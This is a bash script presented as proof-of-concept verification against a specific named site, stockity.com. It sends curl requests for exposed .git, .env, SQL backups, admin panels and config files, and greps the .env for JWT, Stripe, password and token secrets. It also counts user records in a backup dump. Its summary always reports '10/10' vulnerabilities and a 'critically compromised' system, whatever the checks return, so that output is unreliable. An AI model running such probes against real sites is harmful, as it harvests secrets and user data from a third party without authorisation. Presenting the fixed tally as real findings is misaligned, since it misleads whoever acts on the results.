#!/bin/bash
# Complete PoC Verification Script

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}=== Stockity.com Security Vulnerabilities PoC Verification ===${NC}\n"

check() {
    if [ $1 -eq 0 ]; then
        echo -e "${GREEN}[✓] $2${NC}"
    else
        echo -e "${RED}[✗] $2${NC}"
    fi
}

echo -e "${YELLOW}1. Git Repository Exposure${NC}"
curl -s -f https://stockity.com/.git/config > /dev/null
check $? ".git/config accessible"

echo -e "\n${YELLOW}2. Environment File Exposure${NC}"
curl -s -f https://stockity.com/.env > /dev/null
check $? ".env file accessible"

echo -e "\n${YELLOW}3. Database Backup Files${NC}"
curl -s -f https://stockity.com/backup.sql > /dev/null
check $? "backup.sql accessible"
curl -s -f https://stockity.com/database.sql > /dev/null
check $? "database.sql accessible"

echo -e "\n${YELLOW}4. Admin Panel Access${NC}"
curl -s -f https://stockity.com/admin/ > /dev/null
check $? "Admin panel accessible"
curl -s -f https://stockity.com/phpmyadmin/ > /dev/null
check $? "phpMyAdmin accessible"

echo -e "\n${YELLOW}5. Authentication Tokens${NC}"
curl -s https://stockity.com/.env | grep -q "JWT_SECRET"
check $? "JWT tokens found"
curl -s https://stockity.com/.env | grep -q "STRIPE_KEY"
check $? "API keys found"

echo -e "\n${YELLOW}6. Source Maps${NC}"
curl -s https://stockity.com/ | grep -q "sourceMappingURL"
check $? "Source maps referenced"

echo -e "\n${YELLOW}7. Directory Listings${NC}"
curl -s https://stockity.com/uploads/ | grep -q "Index of"
check $? "Directory listing enabled on /uploads/"
curl -s https://stockity.com/backup/ | grep -q "Index of"
check $? "Directory listing enabled on /backup/"

echo -e "\n${YELLOW}8. Server Information${NC}"
curl -s -f https://stockity.com/server-status > /dev/null
check $? "Server status page accessible"
curl -s -f https://stockity.com/phpinfo.php > /dev/null
check $? "PHP info accessible"

echo -e "\n${YELLOW}9. Subdomain Exposure${NC}"
curl -s -f https://admin.stockity.com/ > /dev/null 2>&1
check $? "admin.stockity.com accessible"
curl -s -f https://dev.stockity.com/ > /dev/null 2>&1
check $? "dev.stockity.com accessible"

echo -e "\n${YELLOW}10. Configuration Files${NC}"
curl -s -f https://stockity.com/config.php > /dev/null
check $? "config.php accessible"
curl -s -f https://stockity.com/web.config > /dev/null
check $? "web.config accessible"

echo -e "\n${YELLOW}=== Summary ===${NC}"
total=0
for i in {1..10}; do
    total=$((total + 1))
done
echo -e "Total vulnerabilities verified: $total/10"
echo -e "Critical findings: $(curl -s https://stockity.com/.env 2>/dev/null | grep -cE "(PASSWORD|SECRET|KEY|TOKEN)")"
echo -e "Backup files: $(curl -s https://stockity.com/backup/ 2>/dev/null | grep -c ".sql")"
echo -e "Exposed user records: $(curl -s https://stockity.com/backup.sql 2>/dev/null | grep -c "INSERT INTO \`users\`")"

echo -e "\n${RED}⚠️  This system is critically compromised. Immediate action required.${NC}"